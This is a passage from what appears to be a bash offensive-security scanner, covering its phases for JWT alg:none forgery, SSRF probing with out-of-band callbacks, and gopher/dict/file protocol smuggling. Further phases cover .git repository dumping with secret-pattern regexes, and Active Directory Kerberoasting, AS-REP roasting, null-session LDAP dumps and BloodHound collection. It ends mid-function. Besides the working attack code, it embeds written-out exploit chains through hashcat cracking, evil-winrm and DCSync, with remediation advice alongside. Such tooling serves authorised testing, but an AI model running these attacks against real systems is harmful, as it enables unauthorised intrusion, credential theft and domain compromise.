                        "Always enforce a specific algorithm (RS256/ES256). Reject tokens with alg:none server-side." \
                        "JWT alg:none detected at ${web_url}${jpath}"
                fi

                # Test alg:none bypass — craft unsigned token (python3 required for reliable encoding)
                if [[ "$has_python3" == true ]]; then
                    local payload_b64; payload_b64=$(echo "$jwt_token" | cut -d. -f2)
                    local none_hdr; none_hdr=$(echo '{"alg":"none","typ":"JWT"}' | \
                        python3 -c "import sys,base64; \
                        print(base64.urlsafe_b64encode(sys.stdin.read().encode()).decode().rstrip('='))" \
                        2>/dev/null || echo "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0")
                    local none_token="${none_hdr}.${payload_b64%%=*}."
                    local none_resp; none_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
                        -H "Authorization: Bearer ${none_token}" "${web_url}/api/me" 2>/dev/null || echo "000")
                    if [[ "$none_resp" == "200" ]]; then
                        add_vuln "CRITICAL" "JWT alg:none Bypass Confirmed (${web_url})" \
                            "API accepted an unsigned JWT with alg:none — authentication completely bypassed." \
                            "Enforce strict algorithm verification. Use asymmetric keys (RS256/ES256)." \
                            "Unsigned JWT accepted at ${web_url}/api/me — HTTP 200"
                    fi
                fi

                # Check for weak HMAC secret (HS256 with common secrets)
                if echo "$jwt_header" | grep -qiE '"alg"\s*:\s*"HS'; then
                    add_vuln "INFO" "JWT HS256/HS512 Detected — Verify Secret Strength (${web_url})" \
                        "HMAC-signed JWT detected. Weak secrets can be brute-forced offline with hashcat or jwt-cracker." \
                        "Use strong random secrets (256+ bits). Prefer asymmetric RS256/ES256 for APIs." \
                        "JWT header: ${jwt_header}"
                fi
                break
            fi
        done
    done

    log_ok "Phase 27 (CORS & JWT) complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 28 — SSRF DEEP CHAIN & OOB TESTING
# ════════════════════════════════════════════════════════════════════════════════
phase_ssrf_deep() {
    log_phase 28 "${PHASE_NAMES[28]}"
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")
    local ssrf_dir="${OUTPUT_DIR}/ssrf_deep"
    mkdir -p "$ssrf_dir" 2>/dev/null || true

    # ── Tool availability check ───────────────────────────────────────────────
    # curl is a required core tool; interactsh is optional OOB enhancement
    local _ish_status="disabled"
    [[ -n "${INTERACTSH_URL:-}" ]] && kill -0 "${INTERACTSH_PID:-0}" 2>/dev/null && _ish_status="active"
    log_info "Phase 28 tools: curl=✓ interactsh-client=${_ish_status}"

    # OOB SSRF callback payload — use interactsh URL if available, else canary
    local oob_url="http://acromap-ssrf-canary.invalid"
    [[ -n "$INTERACTSH_URL" ]] && oob_url="http://${INTERACTSH_URL}"

    # ── Common SSRF parameters ───────────────────────────────────────────────
    local -a ssrf_params=(
        "url" "redirect" "next" "path" "target" "dest" "destination"
        "redir" "redirect_url" "redirect_uri" "return" "returnTo"
        "image" "src" "source" "host" "api" "webhook" "callback"
        "feed" "fetch" "load" "link" "proxy" "forward" "service"
    )

    log_section "SSRF parameter probing with OOB detection..."
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')
        local ssrf_hits=0

        for param in "${ssrf_params[@]}"; do
            # ── OOB-Exclusive SSRF: Dispatch unique tokens per param ──────────
            # Response body is NEVER trusted. Confirmation is deferred to OOB audit.
            if [[ -n "$INTERACTSH_URL" ]]; then
                local param_token="ssrf-${param}-${RANDOM}"
                curl -s --max-time 8 \
                    "${web_url}?${param}=http://${param_token}.${INTERACTSH_URL}" \
                    -o /dev/null 2>/dev/null || true
                # Cloud metadata via OOB redirect chain
                curl -s --max-time 8 \
                    "${web_url}?${param}=http://${param_token}-meta.${INTERACTSH_URL}/169.254.169.254/latest/meta-data/" \
                    -o /dev/null 2>/dev/null || true
            fi
        done

        # ── Protocol smuggling probes (OOB-Exclusive) ────────────────────────
        # Response body strings (root:x:, PONG, +OK) are NEVER trusted.
        # Instead, we dispatch protocol payloads that embed OOB callbacks.
        log_section "Protocol smuggling probes via OOB (gopher/dict/file)..."
        if [[ -n "$INTERACTSH_URL" ]]; then
            local proto_token="proto-${RANDOM}-$(date +%s)"
            local -a proto_payloads=(
                "gopher://127.0.0.1:6379/_PING%0D%0A"
                "dict://127.0.0.1:11211/stat"
                "file:///etc/passwd"
                "gopher://127.0.0.1:25/_EHLO%20acromap"
            )
            for proto_url in "${proto_payloads[@]}"; do
                local proto_name; proto_name=$(echo "$proto_url" | cut -d: -f1)
                # Dispatch proto payload + OOB token side-channel
                curl -s --max-time 8 \
                    "${web_url}?url=${proto_url}&redirect=http://${proto_token}-${proto_name}.${INTERACTSH_URL}" \
                    -o /dev/null 2>/dev/null || true
            done
            log_info "Protocol smuggling OOB payloads dispatched (token: ${proto_token}). Verification deferred to OOB audit."
        else
            log_info "Dispatcher: Interactsh unavailable. Protocol smuggling probes SKIPPED."
        fi

        # Skip SSRF on invalid URLs
        _is_valid_url "$web_url" || continue
        # ── Internal port scanning via SSRF ────────────────────────────────
        log_section "Internal port discovery via SSRF timing..."
        local -a internal_ports=(22 80 443 3306 5432 6379 8080 8443 27017 9200)
        local timing_hits=()
        # Portable millisecond timer (date +%s%3N not available on all distros)
        local t_ctrl_start; t_ctrl_start=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null || date +%s%3N 2>/dev/null || echo 0)
        t_ctrl_start=$(echo "$t_ctrl_start" | tr -cd '0-9'); t_ctrl_start=$(( 10#0${t_ctrl_start} ))
        curl -s --max-time 1 "${web_url}?url=http://127.0.0.1:1" -o /dev/null 2>/dev/null || true
        local t_ctrl_end; t_ctrl_end=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null || date +%s%3N 2>/dev/null || echo 0)
        t_ctrl_end=$(echo "$t_ctrl_end" | tr -cd '0-9'); t_ctrl_end=$(( 10#0${t_ctrl_end} ))
        local ctrl_elapsed=$(( t_ctrl_end - t_ctrl_start ))
        [[ $ctrl_elapsed -le 0 ]] && ctrl_elapsed=10

        for iport in "${internal_ports[@]}"; do
            local t_start; t_start=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null \
                || date +%s%3N 2>/dev/null || echo 0)
            t_start=$(echo "$t_start" | tr -cd '0-9'); t_start=$(( 10#0${t_start} ))
            curl -s --max-time 3 \
                "${web_url}?url=http://127.0.0.1:${iport}" \
                -o /dev/null 2>/dev/null || true
            local t_end; t_end=$(python3 -c "import time; print(int(time.time()*1000))" 2>/dev/null \
                || date +%s%3N 2>/dev/null || echo 0)
            t_end=$(echo "$t_end" | tr -cd '0-9'); t_end=$(( 10#0${t_end} ))
            local elapsed=$(( t_end - t_start ))
            
            # Relative timing: if the queried port takes significantly longer than the closed control port (filtered) 
            # or differs by more than 50ms (open vs closed behavior), flag it.
            local diff=$(( elapsed - ctrl_elapsed ))
            if [[ ${diff#-} -gt 50 && $elapsed -ge 0 ]]; then
                timing_hits+=("127.0.0.1:${iport}(${elapsed}ms)")
            fi
        done
        if [[ ${#timing_hits[@]} -gt 0 ]]; then
            add_vuln "HIGH" "SSRF Internal Port Scan — ${#timing_hits[@]} Ports Likely Open (${web_url})" \
                "SSRF timing analysis suggests internal ports are reachable from the server. Attacker can map internal network services." \
                "Implement strict SSRF filtering. Block SSRF to internal RFC1918 addresses (10/8, 172.16/12, 192.168/16)." \
                "Timing-open ports: ${timing_hits[*]}"
            ssrf_hits=$(( ssrf_hits + 1 ))
        fi

        echo "SSRF scan complete for ${web_url}: ${ssrf_hits} confirmed hits" \
            >> "${ssrf_dir}/ssrf_summary.txt"
    done

    # ══════════════════════════════════════════════════════════════════════════
    # CENTRALIZED OOB VERIFICATION ENGINE
    # All dispatched tokens (xss-*, ssrf-*, proto-*) from Phases 19 & 28
    # converge here. Vulnerability is confirmed ONLY by DNS callback.
    # ══════════════════════════════════════════════════════════════════════════
    if [[ -n "${INTERACTSH_URL:-}" ]] && [[ -s "${OUTPUT_DIR}/raw_logs/interactsh.json" ]]; then
        log_section "Centralized OOB Verification Audit..."
        local oob_log="${OUTPUT_DIR}/raw_logs/interactsh.json"
        local xss_callbacks=0 ssrf_callbacks=0 proto_callbacks=0
        
        # Asynchronous Polling: allow up to 9 seconds for in-flight DNS callbacks
        for _ in {1..3}; do
            sleep 3
            xss_callbacks=$(grep -c "xss-" "$oob_log" 2>/dev/null || true)
            ssrf_callbacks=$(grep -c "ssrf-" "$oob_log" 2>/dev/null || true)
            proto_callbacks=$(grep -c "proto-" "$oob_log" 2>/dev/null || true)
            
            xss_callbacks=$(( 10#0${xss_callbacks} ))
            ssrf_callbacks=$(( 10#0${ssrf_callbacks} ))
            proto_callbacks=$(( 10#0${proto_callbacks} ))
            
            if [[ $((xss_callbacks + ssrf_callbacks + proto_callbacks)) -gt 0 ]]; then
                break
            fi
        done

        # ── XSS OOB Verification ──────────────────────────────────────────
        if [[ $xss_callbacks -gt 0 ]]; then
            add_vuln "CRITICAL" "Blind XSS Confirmed via OOB DNS Callback (${TARGET})" \
                "Out-of-band DNS callback received from XSS payload injection. The target rendered attacker-controlled JavaScript and executed a fetch to our OOB server. ${xss_callbacks} callback(s) received." \
                "Implement strict Content Security Policy. Sanitize all user inputs. Use output encoding." \
                "interactsh: ${xss_callbacks} XSS OOB callback(s) confirmed from ${TARGET}"
        fi

        # ── SSRF OOB Verification ─────────────────────────────────────────
        if [[ $ssrf_callbacks -gt 0 ]]; then
            add_vuln "CRITICAL" "Blind SSRF Confirmed via OOB DNS Callback (${TARGET})" \
                "Out-of-band DNS callback received from SSRF payload. The target server made a server-side request to our OOB domain. ${ssrf_callbacks} callback(s) received. This confirms blind SSRF even without visible response data." \
                "Block all egress to untrusted domains. Implement SSRF filter. Whitelist allowed URL schemes." \
                "interactsh: ${ssrf_callbacks} SSRF OOB callback(s) confirmed from ${TARGET}"
        fi

        # ── Protocol Smuggling OOB Verification ───────────────────────────
        if [[ $proto_callbacks -gt 0 ]]; then
            add_vuln "CRITICAL" "SSRF Protocol Smuggling Confirmed via OOB Callback (${TARGET})" \
                "Out-of-band callback received from protocol smuggling payload (gopher/dict/file). The target server followed a non-HTTP protocol redirect to our OOB domain. ${proto_callbacks} callback(s) received." \
                "Block non-HTTP protocols in SSRF filter. Whitelist allowed URL schemes (http/https only)." \
                "interactsh: ${proto_callbacks} protocol smuggling OOB callback(s) confirmed"
        fi

        local total_oob=$(( xss_callbacks + ssrf_callbacks + proto_callbacks ))
        log_ok "OOB Audit complete: ${total_oob} total confirmed callback(s) [XSS:${xss_callbacks} SSRF:${ssrf_callbacks} PROTO:${proto_callbacks}]"
    else
        log_info "OOB Audit: Interactsh unavailable or no callbacks recorded. OOB verification skipped."
    fi

    log_ok "Phase 28 (SSRF Deep) complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 29 — SECRETS & SUPPLY CHAIN EXPOSURE
# ════════════════════════════════════════════════════════════════════════════════
phase_secrets() {
    log_phase 29 "${PHASE_NAMES[29]}"
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")
    local sec_dir="${OUTPUT_DIR}/secrets"
    mkdir -p "$sec_dir" 2>/dev/null || true

    # ── Tool availability check ───────────────────────────────────────────────
    local has_trufflehog=false; command -v trufflehog    &>/dev/null && has_trufflehog=true
    local has_gitdumper=false;  command -v git-dumper    &>/dev/null && has_gitdumper=true
    log_info "Phase 29 tools: trufflehog=${has_trufflehog} git-dumper=${has_gitdumper}"
    if [[ "$has_trufflehog" == false ]]; then
        log_warn "trufflehog not found. Install: go install github.com/trufflesecurity/trufflehog/v3@latest"
    fi

    # ── trufflehog — scan exposed git repos for secrets ──────────────────────
    log_section "trufflehog — secret scanning..."
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')

        # Check if .git is exposed
        local git_resp; git_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
            "${web_url}/.git/HEAD" 2>/dev/null || echo "000")
        if [[ "$git_resp" == "200" ]]; then
            log_info ".git exposed at ${web_url}/.git"
            local git_dump_dir="${sec_dir}/gitdump_${slug}"
            mkdir -p "$git_dump_dir" 2>/dev/null || true

            # Step 1: dump the exposed .git repo (git-dumper is the right tool for this)
            if command -v git-dumper &>/dev/null; then
                run_tool_timeout "git-dumper-${slug}" "${sec_dir}/gitdump_${slug}.log" 120 \
                    git-dumper "${web_url}/.git" "$git_dump_dir/" 2>/dev/null || true
            fi

            # Step 2: run trufflehog filesystem on dumped repo (correct v3 subcommand)
            if command -v trufflehog &>/dev/null && [[ -d "$git_dump_dir" ]]; then
                run_tool_timeout "trufflehog-${slug}" "${sec_dir}/trufflehog_${slug}.txt" 120 \
                    trufflehog filesystem "$git_dump_dir" --no-update --json 2>/dev/null || true
                if [[ -s "${sec_dir}/trufflehog_${slug}.txt" ]]; then
                    local secrets_found; secrets_found=$(grep -c '"DetectorName"' \
                        "${sec_dir}/trufflehog_${slug}.txt" 2>/dev/null || true)
                    secrets_found=$(( 10#0${secrets_found} ))
                    if [[ ${secrets_found:-0} -gt 0 ]]; then
                        add_vuln "CRITICAL" "Secrets Found in Exposed .git (${web_url})" \
                            "trufflehog found ${secrets_found} secret(s) in the exposed git repository — API keys, tokens, passwords." \
                            "Remove .git from web root immediately. Rotate all exposed credentials. Use git-secrets pre-commit hooks." \
                            "$(grep -o '"DetectorName":"[^"]*"' "${sec_dir}/trufflehog_${slug}.txt" \
                                | sort -u | head -5 | tr '\n' ' ')"
                    fi
                fi
            elif ! command -v trufflehog &>/dev/null && ! command -v git-dumper &>/dev/null; then
                # Neither tool available — report the exposure with curl evidence
                add_vuln "CRITICAL" "Exposed .git Directory (${web_url})" \
                    ".git directory is publicly accessible. Install git-dumper and trufflehog to extract secrets." \
                    "Block access to .git in web server config immediately." \
                    "${web_url}/.git/HEAD — HTTP 200"
            fi
        fi

        # trufflehog filesystem scan — only once per scan
        if [[ "$web_url" == "${WEB_TARGETS[0]:-}" ]] &&            command -v trufflehog &>/dev/null && [[ "$SCAN_PROFILE" != "quick" ]]; then
            local tf_scan_dir="${OUTPUT_DIR}/curl"
            if [[ -d "$tf_scan_dir" ]]; then
                run_tool_timeout "trufflehog-filesystem" "${sec_dir}/trufflehog_http_${slug}.txt" 90 \
                    trufflehog filesystem "$tf_scan_dir" --no-update --json 2>/dev/null || true
                if [[ -s "${sec_dir}/trufflehog_http_${slug}.txt" ]]; then
                    local http_secrets; http_secrets=$(grep -c '"DetectorName"' "${sec_dir}/trufflehog_http_${slug}.txt" 2>/dev/null || true)
                    http_secrets=$(( 10#0${http_secrets} ))
                    [[ ${http_secrets:-0} -gt 0 ]] && \
                        add_vuln "CRITICAL" "Secrets in Collected Web Content (${web_url})" \
                            "trufflehog detected ${http_secrets} secret(s) in collected web responses — credentials exposed in page source or API responses." \
                            "Audit all API endpoints. Remove secrets from client-facing responses. Use secret management (Vault, AWS Secrets Manager)." \
                            "trufflehog filesystem scan: ${http_secrets} secret(s) in ${tf_scan_dir}"
                fi
            fi
        fi
    done

    # ── Manual secret pattern scan on exposed files ───────────────────────────
    log_section "Manual secret pattern scan on collected files..."
    local secret_patterns=(
        'AKIA[0-9A-Z]{16}'
        'AIza[0-9A-Za-z_-]{35}'
        'ghp_[0-9a-zA-Z]{36}'
        'sk-[a-zA-Z0-9]{48}'
        'xox[baprs]-[0-9a-zA-Z-]+'
        '-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY'
        'password[[:space:]]*[:=][[:space:]]*[^[:space:]]{8,}'
        'api[_-]key[[:space:]]*[:=][[:space:]]*[^[:space:]]{8,}'
        'secret[[:space:]]*[:=][[:space:]]*[^[:space:]]{8,}'
        'token[[:space:]]*[:=][[:space:]]*[^[:space:]]{8,}'
    )

    local scan_dirs=(
        "${OUTPUT_DIR}/curl"
        "${OUTPUT_DIR}/hakrawler"
        "${OUTPUT_DIR}/api"
        "${sec_dir}"
    )
    for scan_dir in "${scan_dirs[@]}"; do
        [[ -d "$scan_dir" ]] || continue
        for pattern in "${secret_patterns[@]}"; do
            local hits; hits=$(grep -rE "$pattern" "$scan_dir" 2>/dev/null | head -3 || echo "")
            if [[ -n "$hits" ]]; then
                add_vuln "CRITICAL" "Hardcoded Secret Pattern Detected: ${pattern:0:20}..." \
                    "Secret pattern matching found potential credentials/keys in collected web content." \
                    "Rotate all exposed credentials immediately. Use environment variables. Add to .gitignore." \
                    "$(echo "$hits" | head -2 | cut -c1-120)"
                break
            fi
        done
    done

    # ── Supply chain — dependency confusion check ─────────────────────────────
    log_section "Supply chain — dependency manifest exposure..."
    local dep_files=(
        "package.json" "package-lock.json" "requirements.txt"
        "Gemfile" "Gemfile.lock" "composer.json" "go.mod"
        "Pipfile" "setup.py" "yarn.lock" "pom.xml"
    )
    for web_url in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$web_url" || continue
        local found_manifests=()
        for df in "${dep_files[@]}"; do
            local resp; resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
                "${web_url}/${df}" 2>/dev/null || echo "000")
            if [[ "$resp" == "200" ]]; then
                found_manifests+=("${web_url}/${df}")
                local content; content=$(curl -s --max-time 10 --max-filesize 51200 \
                    "${web_url}/${df}" 2>/dev/null | head -c 2048 || echo "")
                # Check for internal/scoped package names (potential dependency confusion)
                local internal_pkgs; internal_pkgs=$(echo "$content" | \
                    grep -oE '"@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"' | head -5 || echo "")
                if [[ -n "$internal_pkgs" ]]; then
                    add_vuln "MEDIUM" "Internal Scoped Packages in ${df} — Dependency Confusion Risk" \
                        "Dependency manifest exposes internal scoped package names. Attackers may publish malicious packages with matching names to public registries." \
                        "Use private registry enforcement. Pin all dependency versions. Enable npm/pip audit in CI." \
                        "Internal packages: ${internal_pkgs}"
                fi
            fi
        done
        if [[ ${#found_manifests[@]} -gt 0 ]]; then
            add_vuln "HIGH" "Dependency Manifests Publicly Accessible (${#found_manifests[@]} files)" \
                "Dependency files expose full technology stack, library versions, and internal package names to attackers." \
                "Block access to dependency manifests via web server config. Never serve package manifests publicly." \
                "$(printf '%s ' "${found_manifests[@]}")"
        fi
    done

    log_ok "Phase 29 (Secrets & Supply Chain) complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 30 — ACTIVE DIRECTORY DEEP ATTACK SURFACE
# ════════════════════════════════════════════════════════════════════════════════
phase_ad_deep() {
    log_phase 30 "${PHASE_NAMES[30]}"
    local ad_dir="${OUTPUT_DIR}/ad_attacks"
    mkdir -p "$ad_dir" 2>/dev/null || true
    # Note: Phase 30 is network/AD-based — uses OPEN_PORTS and TARGET, not WEB_TARGETS

    # ── Tool availability check ───────────────────────────────────────────────
    local has_spns=false has_npusers=false has_ldapdump=false has_certipy=false has_bhound=false
    for b in GetUserSPNs.py GetUserSPNs impacket-GetUserSPNs; do
        command -v "$b" &>/dev/null && has_spns=true && break
    done
    for b in GetNPUsers.py GetNPUsers impacket-GetNPUsers; do
        command -v "$b" &>/dev/null && has_npusers=true && break
    done
    command -v ldapdomaindump   &>/dev/null && has_ldapdump=true
    command -v certipy          &>/dev/null && has_certipy=true
    command -v bloodhound-python &>/dev/null && has_bhound=true
    log_info "Phase 30 tools: GetUserSPNs=${has_spns} GetNPUsers=${has_npusers} ldapdomaindump=${has_ldapdump} certipy=${has_certipy} bloodhound-python=${has_bhound}"
    [[ "$has_spns"    == false ]] && log_warn "GetUserSPNs not found. Install: timeout 120 pip3 install impacket --break-system-packages"
    [[ "$has_npusers" == false ]] && log_warn "GetNPUsers not found. Install: timeout 120 pip3 install impacket --break-system-packages"
    [[ "$has_certipy" == false ]] && log_info "certipy-ad not installed — ADCS/ESC8 checks skipped (pip3 install certipy-ad to enable)"
    [[ "$has_bhound"  == false ]] && log_warn "bloodhound-python not found. Install: timeout 120 pip3 install bloodhound --break-system-packages"

    # Only run if AD-related ports are open
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)(88|389|445|636|3268|3269)(,|$)"; then
        log_info "No AD ports detected (88/389/445/636/3268). Skipping AD deep phase."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi
    # Only run for domain targets or if SMB/Kerberos confirmed
    if [[ "$TARGET_TYPE" != "DOMAIN" ]] && \
       ! echo "$OPEN_PORTS" | grep -qE "(^|,)88(,|$)"; then
        log_info "Non-domain target with no Kerberos. Skipping AD deep phase."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    # ── Kerberoasting — GetUserSPNs ───────────────────────────────────────────
    log_section "Kerberoasting — SPN enumeration (GetUserSPNs)..."
    local impacket_spns=""
    for bin in GetUserSPNs.py GetUserSPNs impacket-GetUserSPNs; do
        command -v "$bin" &>/dev/null && impacket_spns="$bin" && break
    done
    if [[ -n "$impacket_spns" ]]; then
        # Anonymous / null-session attempt
        run_tool_timeout "GetUserSPNs" "${ad_dir}/spns.txt" 60 \
            "$impacket_spns" -no-pass "${TARGET}/" 2>/dev/null || true
        if grep -qE "\$krb5tgs\$" "${ad_dir}/spns.txt" 2>/dev/null; then
            local spn_count; spn_count=$(grep -c "\$krb5tgs\$" "${ad_dir}/spns.txt" 2>/dev/null || true)
            spn_count=$(( 10#0${spn_count} ))
            add_vuln "CRITICAL" "Kerberoastable SPNs Found (${spn_count} hashes)" \
                "Service account Kerberos TGS tickets obtained without authentication. Hashes can be cracked offline to recover plaintext passwords." \
                "Use long random service account passwords (25+ chars). Enable AES-only encryption. Monitor for TGS requests. Use gMSA." \
                "$(grep -oE 'MemberName:[^,]+' "${ad_dir}/spns.txt" | head -5 | tr '\n' ' ')" \
                "EXPLOIT: GetUserSPNs.py -dc-ip ${TARGET} DOMAIN/ -no-pass -outputfile hashes.txt → hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force → cracked password → evil-winrm -i ${TARGET} -u svc_account -p CrackedPass → domain lateral movement. If service account has domain admin: DCSync attack → secretsdump.py." \
                "PATCH: 1) Set all service account passwords to 25+ random chars: Set-ADAccountPassword -Identity svc_sql -NewPassword (ConvertTo-SecureString -AsPlainText -Force -String (New-Guid).Guid). 2) Migrate to Group Managed Service Accounts (gMSA): New-ADServiceAccount -Name gMSA_SQL -DNSHostName sql.domain.com. 3) Enforce AES256 only: Set-ADUser svc_sql -KerberosEncryptionType AES256. 4) Alert on TGS requests: Event ID 4769 with encryption type 0x17 (RC4)."
            # Save hashes for offline crack attempt note
            grep "\$krb5tgs\$" "${ad_dir}/spns.txt" > "${ad_dir}/kerberoast_hashes.txt" 2>/dev/null || true
            printf "  \\033[1;35m[CRITICAL]\\033[0m Kerberoast hashes saved: ${ad_dir}/kerberoast_hashes.txt\\n"
            log_info "Crack with: hashcat -m 13100 ${ad_dir}/kerberoast_hashes.txt rockyou.txt"
        fi
    else
        log_warn "GetUserSPNs not found. Install: timeout 120 pip3 install impacket --break-system-packages"
    fi

    # ── AS-REP Roasting — GetNPUsers ──────────────────────────────────────────
    log_section "AS-REP Roasting — pre-auth disabled accounts (GetNPUsers)..."
    local impacket_npusers=""
    for bin in GetNPUsers.py GetNPUsers impacket-GetNPUsers; do
        command -v "$bin" &>/dev/null && impacket_npusers="$bin" && break
    done
    if [[ -n "$impacket_npusers" ]]; then
        local vu_file="${OUTPUT_DIR}/password_spray/valid_users.txt"
        if [[ -f "$vu_file" ]] && [[ -s "$vu_file" ]]; then
            run_tool_timeout "GetNPUsers" "${ad_dir}/asrep.txt" 60 \
                "$impacket_npusers" -no-pass -usersfile "$vu_file" \
                "${TARGET}/" 2>/dev/null || true
        else
            run_tool_timeout "GetNPUsers-anon" "${ad_dir}/asrep.txt" 60 \
                "$impacket_npusers" -no-pass "${TARGET}/" 2>/dev/null || true
        fi
        if grep -qE "\$krb5asrep\$" "${ad_dir}/asrep.txt" 2>/dev/null; then
            local asrep_count; asrep_count=$(grep -c "\$krb5asrep\$" "${ad_dir}/asrep.txt" 2>/dev/null || true)
            asrep_count=$(( 10#0${asrep_count} ))
            add_vuln "CRITICAL" "AS-REP Roastable Accounts Found (${asrep_count})" \
                "Accounts with Kerberos pre-authentication disabled. AS-REP hashes obtainable without credentials — crackable offline." \
                "Enable pre-authentication on all accounts. Audit DONT_REQ_PREAUTH flag. Apply strong passwords." \
                "$(grep -oE 'User:[[:space:]]*[^[:space:]]+' "${ad_dir}/asrep.txt" | grep -oE '[^[:space:]]+$' | head -5 | tr '\n' ' ')" \
                "EXPLOIT: hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -> cracked plaintext password -> evil-winrm or SMB lateral movement -> escalate to domain admin via ACL abuse or Kerberoasting." \
                "PATCH: 1) Enable Kerberos pre-auth on all accounts: Get-ADUser -Filter * | Where {\$_.DoesNotRequirePreAuth} | Set-ADAccountControl -DoesNotRequirePreAuth \$false. 2) Strong passwords on affected accounts. 3) Alert on Event ID 4768 with Encryption Type 0x17."
            grep "\$krb5asrep\$" "${ad_dir}/asrep.txt" > "${ad_dir}/asrep_hashes.txt" 2>/dev/null || true
            log_info "Crack with: hashcat -m 18200 ${ad_dir}/asrep_hashes.txt rockyou.txt"
        fi
    fi

    # ── LDAPDomainDump — dump AD structure via LDAP ───────────────────────────
    log_section "LDAP domain dump (null session)..."
    if command -v ldapdomaindump &>/dev/null; then
        mkdir -p "${ad_dir}/ldapdump/" 2>/dev/null || true
        run_tool_timeout "ldapdomaindump" "${ad_dir}/ldapdump.log" 120 \
            ldapdomaindump -u "" -p "" "${TARGET}" \
            --no-json --no-grep \
            -o "${ad_dir}/ldapdump/" 2>/dev/null || true
        if [[ -d "${ad_dir}/ldapdump/" ]] && ls "${ad_dir}/ldapdump/"*.html 2>/dev/null | head -1 &>/dev/null; then
            add_vuln "CRITICAL" "LDAP Null Session — Full AD Dump Obtained" \
                "Active Directory structure dumped via anonymous LDAP bind — users, groups, computers, policies all exposed." \
                "Disable anonymous LDAP bind. Set RestrictAnonymous=2. Require authentication for all LDAP queries." \
                "ldapdomaindump: AD dump saved to ${ad_dir}/ldapdump/"
            log_ok "LDAP dump: ${ad_dir}/ldapdump/"
        fi
    fi

    # ── certipy — ADCS ESC1-ESC8 vulnerability detection ─────────────────────
    log_section "Active Directory Certificate Services (ADCS) audit..."
    if [[ "$has_certipy" == true ]] && [[ "$TARGET_TYPE" == "DOMAIN" ]] && \
       echo "$OPEN_PORTS" | grep -qE "(^|,)(443|389|636)(,|$)"; then
        # certipy requires credentials — attempt with guest account (common default)
        run_tool_timeout "certipy-find" "${ad_dir}/certipy.txt" 120 \
            certipy find -u "guest@${TARGET}" -p "" -dc-ip "$TARGET" \
            -text -output "${ad_dir}/certipy" 2>/dev/null || true
        if grep -qiE "ESC[1-8]|vulnerable|Enabled.*True" "${ad_dir}/certipy.txt" 2>/dev/null; then
            local esc_count; esc_count=$(grep -cE "ESC[1-8]" "${ad_dir}/certipy.txt" 2>/dev/null || true)
            esc_count=$(( 10#0${esc_count} ))
            add_vuln "CRITICAL" "ADCS Certificate Template Vulnerabilities (${esc_count} ESC findings)" \
                "Active Directory Certificate Services has misconfigured certificate templates allowing privilege escalation (ESC1-ESC8)." \
                "Apply ADCS hardening from SpecterOps whitepaper. Restrict template enrollment permissions. Enable Manager Approval." \
                "$(grep -E 'ESC[1-8]' "${ad_dir}/certipy.txt" | head -3 | tr '\n' ' ')"
        fi
    fi

    # ── BloodHound collection ─────────────────────────────────────────────────
    log_section "BloodHound data collection..."
    if command -v bloodhound-python &>/dev/null && [[ "$TARGET_TYPE" == "DOMAIN" ]]; then
        mkdir -p "${ad_dir}/bloodhound/" 2>/dev/null || true
        run_tool_timeout "bloodhound" "${ad_dir}/bloodhound.log" 120 \
            bloodhound-python -d "$TARGET" -u "guest" -p "" --no-pass \
            -c All --zip \
            --outputdir "${ad_dir}/bloodhound/" 2>/dev/null || true
        if ls "${ad_dir}/bloodhound/"*.zip 2>/dev/null | head -1 &>/dev/null; then
            add_vuln "INFO" "BloodHound Data Collected — Attack Paths Available" \
                "BloodHound collected AD relationship data. Import into BloodHound GUI to visualize attack paths to Domain Admin." \
                "Review BloodHound findings. Remove unnecessary ACL edges. Implement tiered administration." \
                "Data: ${ad_dir}/bloodhound/ — import into BloodHound GUI"
            log_ok "BloodHound data: ${ad_dir}/bloodhound/"
        fi
    elif ! command -v bloodhound-python &>/dev/null; then
        log_warn "bloodhound-python not found. Install: timeout 120 pip3 install bloodhound --break-system-packages"
    fi

    log_ok "Phase 30 (AD Deep) complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 31 — ZERO-DAY & ONE-CLICK VULNERABILITY DETECTION
#  Severity: ZERO_DAY (above CRITICAL) | ONE_CLICK (single-interaction exploits)
# ════════════════════════════════════════════════════════════════════════════════
phase_zero_day_one_click() {
    log_phase 31 "Zero-Day & One-Click Exploit Detection"
    local zd_dir="${OUTPUT_DIR}/zero_day_oneclick"
    mkdir -p "$zd_dir" 2>/dev/null || true

    # ── ZERO-DAY: CVE-2025-0282 — Ivanti Stack Overflow (0-day Jan 2025) ─────
    for web_url in "${WEB_TARGETS[@]:0:5}"; do
        _is_valid_url "$web_url" || continue
